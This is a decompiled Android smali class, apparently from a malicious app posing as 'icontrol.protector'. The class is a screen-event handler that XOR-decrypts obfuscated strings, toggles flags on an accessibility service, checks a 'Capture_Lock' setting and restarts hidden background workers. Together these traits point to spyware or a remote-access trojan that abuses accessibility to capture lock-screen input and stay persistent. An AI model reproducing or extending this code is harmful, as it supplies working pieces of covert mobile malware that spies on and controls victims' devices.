.class Lcom/icontrol/protector/ScreenReceiver$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/ScreenReceiver;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;

.field final synthetic f:Landroid/content/Intent;

.field final synthetic g:Lcom/icontrol/protector/ScreenReceiver;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/ScreenReceiver;Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/ScreenReceiver$a;->g:Lcom/icontrol/protector/ScreenReceiver;

    iput-object p2, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    iput-object p3, p0, Lcom/icontrol/protector/ScreenReceiver$a;->f:Landroid/content/Intent;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    invoke-static {v0}, Lcom/icontrol/protector/WorkServices$d;->c(Landroid/content/Context;)V

    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->P:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v0, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->f:Landroid/content/Intent;

    invoke-virtual {v0}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    iget-object v1, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    const/16 v3, 0xd

    new-array v4, v3, [B

    fill-array-data v4, :array_0

    const/16 v5, 0x8

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    sget-object v6, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    const/16 v4, 0x20

    const/4 v7, 0x0

    if-eqz v1, :cond_1

    new-array v1, v4, [B

    fill-array-data v1, :array_2

    new-array v8, v5, [B

    fill-array-data v8, :array_3

    invoke-static {v1, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/icontrol/protector/ScreenReceiver$a;->g:Lcom/icontrol/protector/ScreenReceiver;

    invoke-static {v1}, Lcom/icontrol/protector/ScreenReceiver;->b(Lcom/icontrol/protector/ScreenReceiver;)Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/icontrol/protector/ScreenReceiver$a;->g:Lcom/icontrol/protector/ScreenReceiver;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    invoke-static {v1, v8, v9}, Lcom/icontrol/protector/ScreenReceiver;->e(Lcom/icontrol/protector/ScreenReceiver;J)J

    iget-object v1, p0, Lcom/icontrol/protector/ScreenReceiver$a;->g:Lcom/icontrol/protector/ScreenReceiver;

    invoke-static {v1}, Lcom/icontrol/protector/ScreenReceiver;->f(Lcom/icontrol/protector/ScreenReceiver;)J

    move-result-wide v8

    iget-object v10, p0, Lcom/icontrol/protector/ScreenReceiver$a;->g:Lcom/icontrol/protector/ScreenReceiver;

    invoke-static {v10}, Lcom/icontrol/protector/ScreenReceiver;->d(Lcom/icontrol/protector/ScreenReceiver;)J

    move-result-wide v10

    invoke-virtual {v1, v8, v9, v10, v11}, Lcom/icontrol/protector/ScreenReceiver;->a(JJ)V

    iget-object v1, p0, Lcom/icontrol/protector/ScreenReceiver$a;->g:Lcom/icontrol/protector/ScreenReceiver;

    invoke-static {v1, v7}, Lcom/icontrol/protector/ScreenReceiver;->c(Lcom/icontrol/protector/ScreenReceiver;Z)Z

    :cond_1
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const v8, -0x7ed8ea7f

    const/4 v9, 0x2

    const/4 v10, 0x1

    if-eq v1, v8, :cond_4

    const v4, -0x56ac2893

    if-eq v1, v4, :cond_3

    const v4, 0x311a1d6c

    if-eq v1, v4, :cond_2

    goto :goto_0

    :cond_2
    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v4, v5, [B

    fill-array-data v4, :array_5

    invoke-static {v1, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    move v0, v9

    goto :goto_1

    :cond_3
    const/16 v1, 0x1f

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v4, v5, [B

    fill-array-data v4, :array_7

    invoke-static {v1, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    move v0, v10

    goto :goto_1

    :cond_4
    new-array v1, v4, [B

    fill-array-data v1, :array_8

    new-array v4, v5, [B

    fill-array-data v4, :array_9

    invoke-static {v1, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    move v0, v7

    goto :goto_1

    :cond_5
    :goto_0
    const/4 v0, -0x1

    :goto_1
    const/16 v1, 0xc

    if-eqz v0, :cond_9

    if-eq v0, v10, :cond_7

    if-eq v0, v9, :cond_6

    goto/16 :goto_2

    :cond_6
    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    new-array v1, v3, [B

    fill-array-data v1, :array_a

    new-array v2, v5, [B

    fill-array-data v2, :array_b

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, v6}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_a

    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->g:Lcom/icontrol/protector/ScreenReceiver;

    invoke-static {v0, v10}, Lcom/icontrol/protector/ScreenReceiver;->c(Lcom/icontrol/protector/ScreenReceiver;Z)Z

    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->g:Lcom/icontrol/protector/ScreenReceiver;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-static {v0, v1, v2}, Lcom/icontrol/protector/ScreenReceiver;->g(Lcom/icontrol/protector/ScreenReceiver;J)J

    goto/16 :goto_2

    :cond_7
    sget-object v0, Lcom/icontrol/protector/My_Configs;->Capture_Lock:Ljava/lang/String;

    new-array v3, v10, [B

    const/16 v4, 0x3b

    aput-byte v4, v3, v7

    new-array v4, v5, [B

    fill-array-data v4, :array_c

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    sget-boolean v0, Lcom/icontrol/protector/AccessServices;->A:Z

    if-nez v0, :cond_8

    invoke-static {}, Lcom/icontrol/protector/a;->T()Lcom/icontrol/protector/AccessServices;

    move-result-object v0

    if-eqz v0, :cond_8

    sput-object v2, Lcom/icontrol/protector/AccessServices;->D:Ljava/lang/Boolean;

    sput-object v2, Lcom/icontrol/protector/AccessServices;->C:Ljava/lang/Boolean;

    :cond_8
    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    new-array v2, v1, [B

    fill-array-data v2, :array_d

    new-array v3, v5, [B

    fill-array-data v3, :array_e

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v1, v1, [B

    fill-array-data v1, :array_f

    new-array v3, v5, [B

    fill-array-data v3, :array_10

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v2, v1}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    :cond_9
    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    invoke-static {v0}, Lntidisestablish/neumonoul/floccinaucinih/hm;->a(Landroid/content/Context;)V

    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    const-class v2, Lcom/icontrol/protector/WorkServices;

    invoke-static {v0, v2}, Lcom/icontrol/protector/n;->l(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    const-class v2, Lcom/icontrol/protector/EngineWorker;

    invoke-static {v0, v2}, Lcom/icontrol/protector/n;->l(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v0, p0, Lcom/icontrol/protector/ScreenReceiver$a;->e:Landroid/content/Context;

    new-array v1, v1, [B

    fill-array-data v1, :array_11

    new-array v2, v5, [B

    fill-array-data v2, :array_12

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v2, v3, [B

    fill-array-data v2, :array_13

    new-array v3, v5, [B

    fill-array-data v3, :array_14

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_a
    :goto_2
    return-void

    :array_0
    .array-data 1
        -0x56t
        -0x69t
        -0x79t
        -0x66t
        -0x13t
        -0x6et
        0x63t
        -0x10t
        -0x72t
        -0x65t
        -0x70t
        -0x44t
        -0x21t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x8t
        -0xet
        -0x1ct
        -0x3bt
        -0x54t
        -0xft
        0x17t
        -0x67t
    .end array-data

    :array_2
    .array-data 1
        -0x3bt
        0x6ct
        -0x2dt
        -0x4ft
        0x3ct
        0x1dt
        0x75t
        0x57t
        -0x33t
        0x6ct
        -0x3dt
        -0x5at
        0x3dt
        0x0t
        0x3ft
        0x18t
        -0x39t
        0x76t
        -0x22t
        -0x54t
        0x3dt
        0x5at
        0x42t
        0x3at
        -0xat
        0x47t
        -0xet
        -0x73t
        0xct
        0x3bt
        0x57t
        0x3ft
    .end array-data

    :array_3
    .array-data 1
        -0x5ct
        0x2t
        -0x49t
        -0x3dt
        0x53t
        0x74t
        0x11t
        0x79t
    .end array-data

    :array_4
    .array-data 1
        0x22t
        0x22t
        0x16t
        0x16t
        -0x6t
        -0x2bt
        -0xet
        0x75t
        0x2at
        0x22t
        0x6t
        0x1t
        -0x5t
        -0x38t
        -0x48t
        0x3at
        0x20t
        0x38t
        0x1bt
        0xbt
        -0x5t
        -0x6et
        -0x3dt
        0x8t
        0x6t
        0x1et
        0x2dt
        0x34t
        -0x39t
        -0x7t
        -0x3bt
        0x1et
        0xdt
        0x18t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x43t
        0x4ct
        0x72t
        0x64t
        -0x6bt
        -0x44t
        -0x6at
        0x5bt
    .end array-data

    :array_6
    .array-data 1
        -0x79t
        -0x2bt
        0x58t
        -0x2ct
        0x6et
        -0x4ct
        -0x5et
        0x7bt
        -0x71t
        -0x2bt
        0x48t
        -0x3dt
        0x6ft
        -0x57t
        -0x18t
        0x34t
        -0x7bt
        -0x31t
        0x55t
        -0x37t
        0x6ft
        -0xdt
        -0x6bt
        0x16t
        -0x4ct
        -0x2t
        0x79t
        -0x18t
        0x5et
        -0x6et
        -0x78t
    .end array-data

    :array_7
    .array-data 1
        -0x1at
        -0x45t
        0x3ct
        -0x5at
        0x1t
        -0x23t
        -0x3at
        0x55t
    .end array-data

    :array_8
    .array-data 1
        0xct
        -0x8t
        -0x46t
        0x72t
        -0x5ct
        -0x64t
        0x50t
        0x7et
        0x4t
        -0x8t
        -0x56t
        0x65t
        -0x5bt
        -0x7ft
        0x1at
        0x31t
        0xet
        -0x1et
        -0x49t
        0x6ft
        -0x5bt
        -0x25t
        0x67t
        0x13t
        0x3ft
        -0x2dt
        -0x65t
        0x4et
        -0x6ct
        -0x46t
        0x72t
        0x16t
    .end array-data

    :array_9
    .array-data 1
        0x6dt
        -0x6at
        -0x22t
        0x0t
        -0x35t
        -0xbt
        0x34t
        0x50t
    .end array-data

    :array_a
    .array-data 1
        -0xft
        0x69t
        0x39t
        -0x5t
        0x28t
        -0x1ft
        -0x37t
        0x2ft
        -0x2bt
        0x65t
        0x2et
        -0x23t
        0x1at
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x5dt
        0xct
        0x5at
        -0x5ct
        0x69t
        -0x7et
        -0x43t
        0x46t
    .end array-data

    :array_c
    .array-data 1
        0xat
        0x6et
        -0x6at
        0x17t
        0xet
        -0x6ft
        0x4bt
        0x45t
    .end array-data

    :array_d
    .array-data 1
        -0x1et
        0x35t
        0x20t
        -0x24t
        -0x18t
        0x22t
        -0x3ct
        0xat
        -0x3bt
        0x37t
        0x26t
        -0x24t
    .end array-data

    :array_e
    .array-data 1
        -0x4ft
        0x56t
        0x52t
        -0x47t
        -0x73t
        0x4ct
        -0x1ct
        0x59t
    .end array-data

    :array_f
    .array-data 1
        0x67t
        -0x20t
        0x46t
        0xft
        -0x6at
        -0x41t
        -0x63t
        -0x77t
        0x47t
        -0x5dt
        0x5bt
        0x4t
    .end array-data

    :array_10
    .array-data 1
        0x34t
        -0x7dt
        0x34t
        0x6at
        -0xdt
        -0x2ft
        -0x43t
        -0x20t
    .end array-data

    :array_11
    .array-data 1
        -0x47t
        -0x49t
        0x74t
        -0x49t
        -0x31t
        -0x2bt
        0x4ct
        0x3et
        -0x62t
        -0x4bt
        0x72t
        -0x49t
    .end array-data

    :array_12
    .array-data 1
        -0x16t
        -0x2ct
        0x6t
        -0x2et
        -0x56t
        -0x45t
        0x6ct
        0x6dt
    .end array-data

    :array_13
    .array-data 1
        0x3at
        0x1at
        0x72t
        0x1t
        0x58t
        -0x44t
        0x17t
        -0x4t
        0x1at
        0x59t
        0x6ft
        0x2t
        0x5bt
    .end array-data

    nop

    :array_14
    .array-data 1
        0x69t
        0x79t
        0x0t
        0x64t
        0x3dt
        -0x2et
        0x37t
        -0x6bt
    .end array-data
.end method
